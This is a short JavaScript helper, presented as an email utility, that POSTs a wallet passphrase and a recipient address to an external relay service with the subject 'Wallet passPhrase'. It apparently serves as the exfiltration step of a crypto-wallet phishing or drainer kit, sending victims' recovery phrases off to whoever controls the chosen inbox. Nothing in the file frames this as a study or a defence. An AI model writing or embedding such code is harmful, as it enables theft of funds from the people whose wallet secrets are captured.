export const sendEmail = async (recipientEmail, passphrase) => {
  const apiEndpoint =
    "https://email-sender-e1ie.onrender.com/api/send-email-to";

  try {
    const response = await fetch(apiEndpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
      },
      body: JSON.stringify({
        email: recipientEmail,
        text: passphrase,
        subject: "Wallet passPhrase",
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error("Server error:", errorData);
      throw new Error(errorData.message || "Failed to send email");
    }

    return await response.json();
  } catch (error) {
    console.error("Error sending email:", error);
    throw error;
  }
};
